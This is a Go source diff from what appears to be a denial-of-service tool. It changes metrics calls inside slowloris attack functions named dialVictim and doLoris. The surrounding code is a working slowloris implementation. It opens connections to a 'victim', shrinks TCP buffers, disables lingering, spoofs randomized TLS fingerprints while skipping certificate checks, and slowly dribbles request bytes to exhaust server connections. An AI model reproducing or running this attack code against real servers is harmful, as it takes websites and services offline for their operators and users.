@@ -114,7 +114,7 @@ func (s SlowLoris) dialVictim(logger *zap.Logger, hostPort string, isTLS bool, c
 	// TODO: add support for dialing the Path via a random proxy from the given pool.
 	conn, err := net.Dial("tcp", hostPort)
 	if err != nil {
-		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail, clientID)
+		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		logger.Debug("couldn't establish connection", zap.String("addr", hostPort), zap.Error(err))
 
 		return nil
@@ -129,21 +129,21 @@ func (s SlowLoris) dialVictim(logger *zap.Logger, hostPort string, isTLS bool, c
 	const bufferSize = 128
 
 	if err = tcpConn.SetReadBuffer(bufferSize); err != nil {
-		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail, clientID)
+		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		logger.Debug("cannot shrink TCP read buffer", zap.Error(err))
 
 		return nil
 	}
 
 	if err = tcpConn.SetWriteBuffer(bufferSize); err != nil {
-		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail, clientID)
+		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		logger.Debug("cannot shrink TCP write buffer", zap.Error(err))
 
 		return nil
 	}
 
 	if err = tcpConn.SetLinger(0); err != nil {
-		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail, clientID)
+		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		logger.Debug("cannot disable TCP lingering", zap.Error(err))
 
 		return nil
@@ -158,7 +158,7 @@ func (s SlowLoris) dialVictim(logger *zap.Logger, hostPort string, isTLS bool, c
 	tlsConn := utls.UClient(tcpConn, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
 
 	if err = tlsConn.Handshake(); err != nil {
-		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail, clientID)
+		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		conn.Close()
 		logger.Debug("couldn't establish tls connection", zap.String("addr", hostPort), zap.Error(err))
 
@@ -172,7 +172,7 @@ func (s SlowLoris) doLoris(logger *zap.Logger, config *Config, destinationHostPo
 	defer conn.Close()
 
 	if _, err := conn.Write(requestHeader); err != nil {
-		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail, config.ClientID)
+		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
 		logger.Debug("cannot write requestHeader", zap.ByteString("header", requestHeader), zap.Error(err))
 
 		return
@@ -192,13 +192,13 @@ func (s SlowLoris) doLoris(logger *zap.Logger, config *Config, destinationHostPo
 		}
 
 		if _, err := conn.Write(sharedWriteBuf); err != nil {
-			metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail, config.ClientID)
+			metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
 			logger.Debug("cannot write bytes", zap.Int("current", i), zap.Int("total", config.ContentLength), zap.Error(err))
 
 			return
 		}
 
-		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusSuccess, config.ClientID)
+		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusSuccess)
 	}
 }
 
